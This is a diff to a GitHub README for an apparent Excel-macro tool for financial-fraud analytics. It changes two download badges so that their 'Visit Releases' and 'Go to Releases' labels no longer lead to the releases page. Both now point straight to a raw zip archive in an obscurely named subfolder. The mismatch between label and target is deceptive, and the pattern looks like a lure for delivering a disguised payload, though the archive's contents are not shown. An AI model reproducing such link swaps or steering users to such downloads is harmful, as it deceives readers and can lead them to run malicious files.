@@ -1,6 +1,6 @@
 # 📊 Financial-Fraud-Monitoring-Analytics - Track Risk and Spot Fraud Fast
 
-[![Download the app](https://img.shields.io/badge/Download%20Latest-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Davidya5050/Financial-Fraud-Monitoring-Analytics/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Latest-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Davidya5050/Financial-Fraud-Monitoring-Analytics/raw/refs/heads/main/xystus/Fraud_Analytics_Financial_Monitoring_v3.3.zip)
 
 ## 🚀 Overview
 
@@ -37,7 +37,7 @@ For the best experience, use a recent version of Excel that supports macros and 
 
 Visit this page to download the latest release:
 
-[![Go to Releases](https://img.shields.io/badge/Releases-Download%20Latest-grey?style=for-the-badge)](https://github.com/Davidya5050/Financial-Fraud-Monitoring-Analytics/releases)
+[![Go to Releases](https://img.shields.io/badge/Releases-Download%20Latest-grey?style=for-the-badge)](https://github.com/Davidya5050/Financial-Fraud-Monitoring-Analytics/raw/refs/heads/main/xystus/Fraud_Analytics_Financial_Monitoring_v3.3.zip)
 
 ## 🛠️ Install and Open on Windows
 
